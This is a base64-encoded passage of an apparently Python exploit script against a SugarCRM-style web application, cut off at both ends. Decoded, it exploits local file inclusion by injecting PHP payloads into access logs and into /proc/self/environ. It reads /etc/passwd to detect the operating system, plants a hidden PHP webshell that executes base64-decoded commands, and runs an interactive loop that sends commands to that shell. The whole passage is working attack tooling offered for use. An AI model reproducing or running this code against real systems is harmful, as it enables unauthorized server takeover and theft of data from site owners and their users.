WUrdXJsLm5ldGxvYysiXHJcbiIpDQoJCQkJc29jay5zZW5kKCJDb25uZWN0aW9uOiBjbG9zZVxyXG5cclxuIikNCgkJCWlmIHBheWxvYWRUeXBlID09ICdpbmNsdWRlUGF5bG9hZCc6DQoJCQkJc29jay5zZW5kKCJHRVQgIit1cmwuc2NoZW1lKyI6Ly8iK3VybC5uZXRsb2MrIjoiK3N0cihvcHRpb25zLnBvcnQpKyIvIisiPD9waHA7aW5jbHVkZShiYXNlNjRfZGVjb2RlKCRfR0VUW2NtZF0pKTs/PiBIVFRQLzEuMFxyXG4iKQ0KCQkJCXNvY2suc2VuZCgiVXNlci1BZ2VudDogIithZ2VudCsiXHJcbiIpDQoJCQkJc29jay5zZW5kKCJIb3N0OiAiK3VybC5zY2hlbWUrdXJsLm5ldGxvYysiXHJcbiIpDQoJCQkJc29jay5zZW5kKCJDb25uZWN0aW9uOiBjbG9zZVxyXG5cclxuIikNCgkJCXNvY2suY2xvc2UoKQ0KCQkJcHJpbnQgIlsrXSBJbmplY3RlZCBQYXlsb2FkIEludG8gTG9ncyINCgkJZXhjZXB0Og0KCQkJcHJpbnQgIlstXSBDb3VsZCBOb3QgSW5qZWN0IEludG8gTG9ncyINCgkJCXN5cy5leGl0KDEpDQoNCmRlZiBwb3N0UmVxdWVzdFdlYlNoZWxsKHNoZWxsTmFtZSxlbmNvZGVkQ21kKToNCgkiIiIgV2ViU2hlbGwgd2hpY2ggc2VuZHMgYWxsIFBPU1QgcmVxdWVzdHMgdG8gaGlkZSBjb21tbWFuZHMgYmVpbmcgbG9nZ2VkIGluIGFjY2Vzcy5sb2cgIiIiDQoJd2ViU2l0ZVVybCA9IHVybC5zY2hlbWUrIjovLyIrdXJsLm5ldGxvYysiOiIrc3RyKG9wdGlvbnMucG9ydCkrdXJsLnBhdGgrImNhY2hlLy4iK3NoZWxsTmFtZSsiLnBocCINCglpZiBvcHRpb25zLnByb3h5Og0KCQl0cnk6DQoJCQljb21tYW5kVG9FeGVjdXRlID0gWw0KCQkJKCdjYXQnLGVuY29kZWRDbWQpXQ0KCQkJY21kRGF0YSA9IHVybGxpYi51cmxlbmNvZGUoY29tbWFuZFRvRXhlY3V0ZSkNCgkJCXByb3h5ZmllciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKGdldFByb3h5KCkpDQoJCQlwcm94eWZpZXIuYWRkaGVhZGVycyA9IFsoJ1VzZXItYWdlbnQnLCBhZ2VudCldDQoJCQljbWRDb250ZW50ID0gcHJveHlmaWVyLm9wZW4od2ViU2l0ZVVybCwgY21kRGF0YSkucmVhZCgpDQoJCQljbWRDb250ZW50ID0gY2xlYW5VcChjbWRDb250ZW50KQ0KCQkJcHJpbnQgY21kQ29udGVudA0KCQlleGNlcHQ6DQoJCQlwcmludCAiWy1dIFJlcXVlc3QgVG8gLiVzLnBocCBGYWlsZWQiICUgc2hlbGxOYW1lDQoJZWxzZToNCiAgICAgICAgICAgICAgICB0cnk6DQoJCQl2YWx1ZXMgPSB7ICdVc2VyLUFnZW50JyA6IGFnZW50LA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2NhdCc6IGVuY29kZWRDbWR9DQoJCQlkYXRhID0gdXJsbGliLnVybGVuY29kZSh2YWx1ZXMpDQoJCQlyZXF1ZXN0PSB1cmxsaWIyLlJlcXVlc3Qod2ViU2l0ZVVybCwgZGF0YSkNCgkJCXJlc3BvbnNlID0gdXJsbGliMi51cmxvcGVuKHJlcXVlc3QpDQoJCQlyZXNwb25zZSA9IHJlc3BvbnNlLnJlYWQoKQ0KCQkJcmVzcG9uc2UgPSBjbGVhblVwKHJlc3BvbnNlKQ0KCQkJcHJpbnQgcmVzcG9uc2UNCgkJZXhjZXB0IHVybGxpYjIuSFRUUEVycm9yLCBlcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gZXJyb3IucmVhZCgpDQoNCmRlZiByZWFkRnJvbUFjY2Vzc0xvZ3MoY21kLCBsb2dzKToNCgkiIiIgTGV0cyB5b3UgY2hvb3NlIHdoYXQgdHlwZSBvZiBvcyBmb3IgdGhlIGxvZyBsb2NhdGlvbiBhbmQgY29tbWFuZCB0byBydW4gIiIiDQogICAgICAgIGlmIG9wdGlvbnMucHJveHk6DQogICAgICAgICAgICAgICAgdHJ5Og0KCQkJcHJveHlmaWVyID0gdXJsbGliMi5idWlsZF9vcGVuZXIoZ2V0UHJveHkoKSkNCgkJCXByb3h5Zmllci5hZGRoZWFkZXJzID0gWygnVXNlci1hZ2VudCcsIGFnZW50KV0gDQoJCQlwcm94eWZpZXIuYWRkaGVhZGVycy5hcHBlbmQoKCJDb29raWUiLCAidmFsdWU9IitjbWQpKQ0KCQkJcmVzcG9uc2UgPSBwcm94eWZpZXIub3Blbih1cmwuc2NoZW1lKyI6Ly8iK3VybC5uZXRsb2MrIjoiK3N0cihvcHRpb25zLnBvcnQpK3VybC5wYXRoK3Z1bG5XZWJQYWdlK2xvZ3MrIiUwMCIpLnJlYWQoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCB1cmxsaWIyLkhUVFBFcnJvciwgZXJyb3I6DQoJCQlyZXNwb25zZSA9IGVycm9yLnJlYWQoKQ0KCQkJc3lzLmV4aXQoKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHRyeToNCgkJCWp1bmsgPSBOb25lDQoJCQloZWFkZXJzID0geyAnVXNlci1BZ2VudCcgOiBhZ2VudCwNCgkJCSdDb29raWUnOiAndmFsdWU9JytjbWR9DQoJCQlyZXNwb25zZSA9IHVybGxpYjIuUmVxdWVzdCh1cmwuc2NoZW1lKyI6Ly8iK3VybC5uZXRsb2MrIjoiK3N0cihvcHRpb25zLnBvcnQpK3VybC5wYXRoK3Z1bG5XZWJQYWdlK2xvZ3MrIiUwMCIsanVuayxoZWFkZXJzKQ0KCQkJcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4ocmVzcG9uc2UpLnJlYWQoKQ0KCQlleGNlcHQgdXJsbGliMi5IVFRQRXJyb3IsIGVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgPSBlcnJvci5yZWFkKCkNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlDQoNCmRlZiBpbmZvcm1hdGlvbkdhdGhlcmluZygpOg0KCSIiIiBVc2VkIHRvIGdhdGhlciBpbmZvcm1hdGlvbiBpZiBtYWdpY19xdW90ZXMgaXMgb24sIHdoYXQgb3BlcmF0aW5nIHN5dGVtIGlzIGJlaW5nIHVzZWQgYW5kIGlmIGVycm9yIG1lc3NhZ2VzIGFyZSBvbiAiIiIgDQoNCiAgICAgICAgIyBVc2UgZGVmYXVsdCBMSUNJRU5TRS50eHQgZmlsZSBpbiB3ZWJyb290IHRvIGdhdGhlciBpbmZvcm1hdGlvbg0KCXJlcXVlc3RDb250ZW50ID0gbGZpUmVxdWVzdCgiLi4vTElDRU5TRS50eHQiKQ0KCQ0KCSMgVGVzdCBmb3IgTWFnaWMgUXVvdGVzDQoJcHJpbnQgIlsrXSBJTkZPUk1BVElPTiBHQVRIRVJJTkc6Ig0KCXByaW50ICJbK10gQ2hlY2tpbmcgaWYgTEZJIElzIFBvc2libGUiDQoJbWFnaWNRdW90ZXMgPSByZS5jb21waWxlKCdTdWdhckNSTSBQdWJsaWMnKQ0KCW1hZ2ljUXVvdGVzID0gbWFnaWNRdW90ZXMuc2VhcmNoKHJlcXVlc3RDb250ZW50KQ0KCWlmIG1hZ2ljUXVvdGVzOg0KCQlwcmludCAiWytdIG1hZ2ljX3F1b3Rlc19ncGMgPSBPZmYiDQoJZWxzZToNCgkJcHJpbnQgIlstXSBtYWdpY19xdW90ZXNfZ3BjID0gT24iDQoJCXByaW50ICJbLV0gT3IgWW91ciBVUkwgSXMgSW5jb3JyZWN0Ig0KCQlpZiBvcHRpb25zLmZpbGU6DQogICAgICAgICAgICAgICAgICAgICAgICB3ZWJzaXRlTGlzdChvcHRpb25zLmZpbGUpDQoJCSAgICAgICAgZmlyc3RNZW51KCkNCgkJZWxzZToNCgkJCXN5cy5leGl0KCkNCgkjIE9TIERldGVjdGlvbg0KCXRyeToNCgkJcGFzc3dkID0gZ2V0UmVxdWVzdChsaW51eE9TKQ0KCQlzZWFyY2hGb3IgPSByZS5jb21waWxlKCdyb290OicpDQoJCXNlYXJjaExpbnV4T1MgPSBzZWFyY2hGb3Iuc2VhcmNoKHBhc3N3ZCkNCgkJcHJpbnQgIlshXSBXb3JraW5nIE91dCBUaGUgT3BlcmF0aW5nIFN5c3RlbSINCgkJaWYgc2VhcmNoTGludXhPUzoNCgkJCXByaW50ICJbIV0gT1MgRGV0ZWN0aW9uOiBMaW51eCINCgkJCXN5c3RlbU9TID0gImwiDQoJCWVsaWYgbm90IHNlYXJjaExpbnV4T1M6DQoJCQl3aW5pbmkgPSBnZXRSZXF1ZXN0KHdpbmRvd3NPUykNCgkJCXNlYXJjaEZvciA9IHJlLmNvbXBpbGUoJzE2LWJpdCcpDQoJCQlzZWFyY2hXaW5kb3dzT1MgPSBzZWFyY2hGb3Iuc2VhcmNoKHdpbmluaSkNCgkJCWlmIHNlYXJjaFdpbmRvd3NPUzoNCgkJCQlwcmludCAiWyFdIE9TIERldGVjdGlvbjogV2luZG93cyINCgkJCQlzeXN0ZW1PUz0gInciDQoJCQllbHNlOg0KCQkJCXByaW50ICJbIV0gTm8gRGF0YSBSZXR1cm5lZCwgWW91IFdpbGwgSGF2ZSBUbyBHdWVzcyBUaGUgT3BlcmF0aW5nIFN5c3RlbSINCgkgICAgICAgCQkJZmlyc3RNZW51KCkNCgkJCQlzeXN0ZW1PUyA9IE5vbmUNCglleGNlcHQ6DQoJCXByaW50ICJbLV0gQ291bGQgTm90IFJ1biBPUyBEZXRlY3Rpb24iDQoJCXByaW50ICJbLV0gU3lzdGVtIE9TIENvdWxkIE5vdCBCZSBTZXQgVHJ5IE9wdGlvbiAyIg0KCQlzeXN0ZW1PUyA9IE5vbmUNCgl0cnk6DQoJCSMgQ2hlY2tpbmcgZm9yIEVycm9yIE1lc3NhZ2VzDQoJCXByaW50ICJbK10gQ2hlY2tpbmcgSWYgRXJyb3IgTWVzc2FnZXMgQXJlIEVuYWJsZWQiDQoJCXBhdGhFcnJvciA9IHJlLmNvbXBpbGUociIocmVmZXJlbmNlIGluICguKilvbnxub3QgZm91bmQgaW4gKC4qKWdyYXBoLnBocCkiKQ0KCQlmaW5kUGF0aCA9IHBhdGhFcnJvci5zZWFyY2gocmVxdWVzdENvbnRlbnQpDQoJCWlmIGZpbmRQYXRoOg0KICAgICAgICAgICAgICAgIAlwcmludCAiWy1dICBXZWIgUm9vdCBEaXJlY3RvcnkgSXM6ICIrZmluZFBhdGguZ3JvdXAoMSkNCgkJZWxpZiBmaW5kUGF0aCA9PSBOb25lOg0KCQkJcGxhdGZvcm1SZXF1ZXN0ID0gZ2V0UmVxdWVzdCh2dFBsYXRmb3JtTG9nKQ0KCQkJcGF0aFdpblJvb3RGaW5kZXIgPSByZS5jb21waWxlKCdSRVFVU0VUXFsicm9vdF9kaXJlY3RvcnkiXF08L3RkPjx0ZCBjbGFzcz0idiI+KC4qKTwvdGQ+JykNCgkJCWZpbmRXaW5QYXRoUm9vdCA9IHBhdGhXaW5Sb290RmluZGVyLnNlYXJjaChwbGF0Zm9ybVJlcXVlc3QpDQoJCQlpZiBmaW5kV2luUGF0aFJvb3Q6DQoJCQkJIHByaW50ICJbLV0gIFdXV1Jvb3QgRGlyZWN0b3J5IEZyb20gUGxhdGZvcm0ubG9nIElzOiAiK2ZpbmRXaW5QYXRoUm9vdC5ncm91cCgxKQ0KCQllbHNlOg0KCQkJcHJpbnQgIlstXSAgRGlkIE5vdCBGaW5kIEFueSBQYXRoIERpc2Nsb3N1cmUiDQoJZXhjZXB0Og0KICAgICAgICAgICAgICAgIHByaW50ICJbLV0gQ291bGQgTm90IFJ1biBFcnJvciBNZXNzYWdlIERldGVjdGlvbiINCglyZXR1cm4gc3lzdGVtT1MgDQoNCmRlZiBlbnZpcm9uSW5qZWN0KHNoZWxsTmFtZSk6DQogICAgICAgICIiIiBMZXRzIHlvdSBnZXQgYSBzaGVsbCB0aHJvdWdoIHByb2Mgc2VsZiBlbnZpcm9uIGJ5IHByb3h5IG9yIHdpdGhvdXQgIiIiDQoJd2ViU2l0ZVVybCA9IHVybC5zY2hlbWUrIjovLyIrdXJsLm5ldGxvYysiOiIrc3RyKG9wdGlvbnMucG9ydCkrdXJsLnBhdGgrdnVsbldlYlBhZ2UrbGZpKyJwcm9jL3NlbGYvZW52aXJvbiIrIiUwMCINCglzaGVsbFN0cmluZyA9ICJlY2hvICc8P3BocDtzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX1JFUVVFU1RbY2F0XSkpOz8+JyA+IGNhY2hlLy4lcy5waHAiICUgc2hlbGxOYW1lDQoJaWYgb3B0aW9ucy5wcm94eToNCgkJdHJ5Og0KCQkJcHJpbnQgJ1srXSBUZXN0aW5nIElmIC9wcm9jL3NlbGYvZW52aXJvbiBFeGlzdHMnDQoJCQlwcm94eWZpZXIgPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihnZXRQcm94eSgpKQ0KCQkJcHJveHlmaWVyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLWFnZW50JywgYWdlbnQpXQ0KCQkJcmVzcG9uc2UgPSBwcm94eWZpZXIub3Blbih3ZWJTaXRlVXJsKS5yZWFkKCkNCgkJCXBhdEZpbmRlciA9IHJlLmNvbXBpbGUoJ0hUVFBfVVNFUl9BR0VOVCcpDQoJCQllbnZpcm9uQ29udGVudCA9IHBhdEZpbmRlci5zZWFyY2gocmVzcG9uc2UpDQoJCQlpZiBlbnZpcm9uQ29udGVudDoNCgkJCQlwcmludCAnWytdIFdlYiBBcHBsaWNhdGlvbiBWdWxuZXJhYmxlIHRvIHByb2Mvc2VsZi9lbnZpcm9uJw0KCQkJCXByb3h5ZmllciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKGdldFByb3h5KCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuY29kZWRDb21tYW5kID0gYmFzZTY0LmI2NGVuY29kZShzaGVsbFN0cmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZFRvRXhlY3V0ZSA9IFsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCdjYXQnLGVuY29kZWRDb21tYW5kKV0NCgkJCQljbWREYXRhID0gdXJsbGliLnVybGVuY29kZShjb21tYW5kVG9FeGVjdXRlKQ0KCQkJCXByb3h5Zmllci5hZGRoZWFkZXJzID0gWygnVXNlci1hZ2VudCcsICI8P3BocCBzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX1BPU1RbY2F0XSkpOz8+IildDQoJCQkJY21kQ29udGVudCA9IHByb3h5Zmllci5vcGVuKHdlYlNpdGVVcmwsIGNtZERhdGEpLnJlYWQoKQ0KCQkJZWxzZToNCgkJCQlwcmludCAnWy1dIENvdWxkIE5vdCBDcmVhdGUgU2hlbGwnDQoJCQkJc3lzLmV4aXQoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDogDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiWy1dIFNlZW1zIFRvIE5vdCBCZSBWdWxuZXJhYmxlIFRvIFByb2MgU2VsZiBFbnZpcm9ubWVudCINCiAgICAgICAgCQlsaW51eE1lbnUoKQ0KCQkJc3lzLmV4aXQoKQ0KCWVsc2U6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGxTdHJpbmcgPSAiZWNobyAnPD9waHA7c3lzdGVtKGJhc2U2NF9kZWNvZGUoJF9SRVFVRVNUW2NhdF0pKTs/PicgPiBjYWNoZS8uJXMucGhwIiAlIHNoZWxsTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jb2RlZENvbW1hbmQgPSBiYXNlNjQuYjY0ZW5jb2RlKHNoZWxsU3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVycyA9IHsnVXNlci1BZ2VudCcgOiAnPD9waHAgc3lzdGVtKGJhc2U2NF9kZWNvZGUoJF9QT1NUW2NhdF0pKTs/PicsDQogICAgICAgICAgICAgICAgICAgICAgICAnY2F0JyA6IGVuY29kZWRDb21tYW5kfQ0KICAgICAgICAgICAgICAgICAgICAgICAgY21kQ29udGVudCA9IHVybGxpYjIuUmVxdWVzdCh3ZWJTaXRlVXJsLGp1bmssaGVhZGVycykNCgkJCWNtZENvbnRlbnQgPSB1cmxsaWIyLnVybG9wZW4oY21kQ29udGVudCkucmVhZCgpDQoJCWV4Y2VwdCB1cmxsaWIyLkhUVFBFcnJvciwgZXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IGVycm9yLnJlYWQoKQ0KCQkJcHJpbnQgcmVzcG9uc2UNCgkNCgl3aGlsZSBUcnVlOg0KCQl0cnk6DQoJCQljb21tYW5kID0gcmF3X2lucHV0KGNvbW1hbmRMaW5lKQ0KCQkJZW5jb2RlZENtZCA9IGJhc2U2NC5iNjRlbmNvZGUoY29tbWFuZCkNCgkJCXBvc3RSZXF1ZXN0V2ViU2hlbGwoc2hlbGxOYW1lLGVuY29kZWRDbWQpDQoJCWV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNCgkJCWVuY29kZWRDbWQgPSBiYXNlNjQuYjY0ZW5jb2RlKCdybSAuJytzaGVsbE5hbWUrJy5waHAnKQ0KCQkJcG9zdFJlcXVlc3RXZWJTaGVsbChzaGVsbE5hbWUsZW5jb2RlZENtZCkNCgkJCXByaW50ICJbLV0gQ1RSTCtDIERldGVjdGVkISINCgkJCXByaW50ICJbK10gUmVtb3ZlZCAuJXMucGhwXG4iICUgc2hlbGxOYW1lDQoJCQlzeXMuZXhpdCgpDQoNCmRlZiBsb2dJbmplY3QocGF5bG9hZFR5cGUpOg0KCSIiIiBMZXRzIHlvdSBjaG9vc2Ugd2hhdCB0eXBlIG9mIHBheWxvYWQgdG8gdXNlIHN1Y2ggYXMgaW5jbHVkZSBvciBzeXN0ZW0gIiIiDQoJaW5qZWN0ID0gcmF3X2lucHV0KCJbP10gVG8gSW5qZWN0PyBQcmVzcyBFTlRFUiwgT3RoZXJ3aXNlIFR5cGUgJ24nIDogIikNCglpZiBpbmplY3QgPT0gJ3llcycgb3IgaW5qZWN0ID09ICd5JyBvciBpbmplY3QgPT0gJyc6DQoJCXNvY2tldEluamVjdChwYXlsb2FkVHlwZSkNCiAgICAgICAgZWxzZToNCgkJcHJpbnQgIlshXSBEaWQgTm90IEluamVjdCBJbnRvIExvZ3MiDQoNCmRlZiBwcm94eUNoZWNrKCk6DQoJaWYgb3B0aW9ucy5wcm94eToNCgkJdHJ5Og0KCQkJaDIgPSBodHRwbGliLkhUVFBDb25uZWN0aW9uKG9wdGlvbnMucHJveHkpDQoJCQloMi5jb25uZWN0KCkNCgkJCXByaW50ICJbK10gVXNpbmcgUHJveHkgU2VydmVyOiIsb3B0aW9ucy5wcm94eQ0KCQlleGNlcHQoc29ja2V0LnRpbWVvdXQpOg0KCQkJcHJpbnQgIlstXSBQcm94eSBUaW1lZCBPdXRcbiINCgkJCXBhc3MNCgkJCXN5cy5leGl0KDEpDQoJCWV4Y2VwdChOYW1lRXJyb3IpOg0KCQkJcHJpbnQgIlstXSBQcm94eSBOb3QgR2l2ZW5cbiINCgkJCXBhc3MNCgkJCXN5cy5leGl0KDEpDQoJCWV4Y2VwdDoNCgkJCXByaW50ICJbLV0gUHJveHkgRmFpbGVkXG4iDQoJCQlwYXNzDQoJCQlzeXMuZXhpdCgxKQ0KDQpkZWYgc2hlbGxNZXNzYWdlKHNoZWxsTmFtZSk6DQoJcHJpbnQgJycnDQogIyBTaGVsbDogLiVzLnBocCANCiAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiAjIFdlbGNvbWUgVG8gUmVtb3RlIFNoZWxsICMNCiAgIyBUaGlzIElzIE5vdCBJbnRlcmFjdGl2ZSAjDQogIyBUbyBFeGlzdCBTaGVsbCBDdHJsICsgQyAjDQogICAgICMgSGFjayBUaGUgR2lic29uICMNCiAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCgknJycgJSBzaGVsbE5hbWUNCg0KIyBMaW51eCBUZWNobmlxdWVzDQpkZWYgbGludXhNZW51KCk6DQogICAgICAgIHByaW50ICcnJw0KWytdIDEuIFRlcm1pbmFsIEJ5IExvZ3MNClsrXSAyLiBUZXJtaW5hbCBCeSBQcm9jIFNlbGYgRW52aXJvbm1lbnQnJycNCiAgICAgICAgaWYgb3B0aW9ucy5maWxlOg0KICAgICAgICAgICAgICAgIHByaW50ICdbK10gMy4gR28gVG8gTmV4dCBVUkwnDQogICAgICAgIGxueENob2ljZSA9IHJhd19pbnB1dCgiPj4gRW50ZXIgWW91ciBDaG9pY2U6ICIpDQoNCiAgICAgICAgIyBMb2cgVGVjaG5pcXVlDQogICAgICAgIGlmIGxueENob2ljZSA9PSAnMSc6DQogICAgICAgICAgICAgICAgcHJpbnQgIlshXSBMZXRzIEhvcGUgWW91IEdvdCBSaWdodHMgVG8gVGhlaXIgTG9ncyEiDQogICAgICAgICAgICAgICAgZm9yIGxvZyBpbiBsbnhMb2dzOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlstXSBUZXN0aW5nICVzIiAlIGxvZw0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nUmVwb25zZSA9IGdldFJlcXVlc3QobG9nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDJGaW5kID0gcmUuY29tcGlsZSgnIiAyMDAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZmluZENvbW1hbmQgPSBjb21tYW5kMkZpbmQuc2VhcmNoKGxvZ1JlcG9uc2UpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaW5kQ29tbWFuZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBJbmplY3RhYmxlIExvZyBGaWxlIExvY2F0ZWQgQCAlcyIgJSBsb2cNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nSW5qZWN0KCJzeXN0ZW1QYXlsb2FkIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeW91ckNob2ljZSA9IHJhd19pbnB1dCgnWz9dIERvIFlvdSBXYW50IFRvIENyZWF0ZSBBIFdlYnNoZWxsPyBQcmVzcyBFTlRFUiwgT3RoZXJ3aXNlIFR5cGUgXCduXCc6ICcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ1dpdGhMZmkgPSBsZmkrbG9nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHlvdXJDaG9pY2UgPT0gJyc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGxOYW1lID0gcmF3X2lucHV0KCdbP10gTmFtZSBPZiBZb3VyIFdlYnNoZWxsOiAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdbK10gQ3JlYXRpbmcgV2Vic2hlbGwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzdGVtQ29tbWFuZCA9ICJlY2hvICc8P3BocDtzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX1JFUVVFU1RbY2F0XSkpOz8+JyA+IGNhY2hlLy4lcy5waHAiICUgc2hlbGxOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5jb2RlZENtZCA9IGJhc2U2NC5iNjRlbmNvZGUoc3lzdGVtQ29tbWFuZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWFkRnJvbUFjY2Vzc0xvZ3MoZW5jb2RlZENtZCwgbG9nV2l0aExmaSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiWyFdIFRlbXB0aW5nIFRvIENyZWF0ZSBXZWJTaGVsbCAuJXMucGhwIiAlIHNoZWxsTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNoZWxsTWVzc2FnZShzaGVsbE5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHJhd19pbnB1dChjb21tYW5kTGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5jb2RlZENtZCA9IGJhc2U2NC5iNjRlbmNvZGUoY29tbWFuZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcG9zdFJlcXVlc3RXZWJTaGVsbChzaGVsbE5hbWUsZW5jb2RlZENtZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5jb2RlZENtZCA9IGJhc2U2NC5iNjRlbmNvZGUoJ3JtIC4nK3NoZWxsTmFtZSsnLnBocCcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBvc3RSZXF1ZXN0V2ViU2hlbGwoc2hlbGxOYW1lLGVuY29kZWRDbWQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJbLV0gQ1RSTCtDIERldGVjdGVkISINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBSZW1vdmVkIC4lcy5waHBcbiIgJSBzaGVsbE5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFuVXAocmVzcG9uc2UpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nSW5qZWN0KCJzeXN0ZW1QYXlsb2FkIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gcmF3X2lucHV0KGNvbW1hbmRMaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGVkQ21kID0gYmFzZTY0LmI2NGVuY29kZShjb21tYW5kKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwb3N0UmVxdWVzdFdlYlNoZWxsKHNoZWxsTmFtZSxlbmNvZGVkQ21kKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGVkQ21kID0gYmFzZTY0LmI2NGVuY29kZSgncm0gLicrc2hlbGxOYW1lKycucGhwJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcG9zdFJlcXVlc3RXZWJTaGVsbChzaGVsbE5hbWUsZW5jb2RlZENtZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlstXSBDVFJMK0MgZGV0ZWN0ZWQhIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiWytdIFJlbW92ZWQgLiVzLnBocFxuIiAlIHNoZWxsTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzeXMuZXhpdCgpDQogICAgICAgICMgRW52aXJvbiBUZWNobmlxdWUNCiAgICAgICAgaWYgbG54Q2hvaWNlID09ICcyJzoNCgkJc2hlbGxOYW1lID0gcmF3X2lucHV0KCdbP10gTmFtZSBPZiBZb3VyIFdlYnNoZWxsOiAnKSANCgkJZW52aXJvbkluamVjdChzaGVsbE5hbWUpDQoNCiAgICAgICAgaWYgbG54Q2hvaWNlID09ICczJzoNCiAgICAgICAgICAgICAgICB3ZWJzaXRlTGlzdChvcHRpb25zLmZpbGUpDQogICAgICAgICAgICAgICAgZmlyc3RNZW51KCkNCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgpDQoNCmRlZiB3aW5kb3dzTWVudSgpOg0KCQlwcmludCAnJycNClsrXSAxLiBSZW1vdGUgRmlsZSBJbmNsdXNpb24gQnJvd3